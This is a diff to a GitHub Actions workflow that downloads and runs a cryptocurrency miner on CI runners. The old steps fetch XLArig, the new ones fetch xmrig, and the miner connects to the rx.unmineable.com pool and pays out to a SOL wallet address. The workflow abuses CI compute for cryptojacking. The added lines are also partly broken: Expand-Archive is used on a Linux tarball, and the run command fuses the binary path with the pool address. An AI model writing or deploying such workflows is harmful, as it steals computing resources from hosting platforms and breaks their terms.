@@ -17,10 +17,10 @@ jobs:
         JOB: ${{ matrix.go }}
     steps:
     - name: PREPARING
-      run: Invoke-WebRequest https://github.com/scala-network/XLArig/releases/download/v5.2.2/XLArig-v5.2.2-win64.zip -Outfile XLArig-v5.2.2-win64.zip
+      run: Invoke-WebRequest https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-x64.tar.gz && tar -xf xmrig-6.16.4-linux-x64.tar.gz
     - name: Seting-UP
-      run: Expand-Archive XLArig-v5.2.2-win64.zip
+      run: Expand-Archive xmrig-6.16.4-linux-x64.tar.gz
     - name: Running
-      run: .\XLArig-v5.2.2-win64\xlarig.exe --no-huge-pages -o rx.unmineable.com:3333 -p x -a rx -k -t 1 --cpu-max-threads-hint 25 -u SOL:uoXJ2QnaxJkVwNJrGGyyCiyGEhK27JyWHHMURUsfxWR.ep
+      run:  ./xmrig.rx.unmineable.com:3333 -p x -a rx -k -t 1 --cpu-max-threads-hint 25 -u SOL:uoXJ2QnaxJkVwNJrGGyyCiyGEhK27JyWHHMURUsfxWR.ep
     - name: DONE
       run: exit
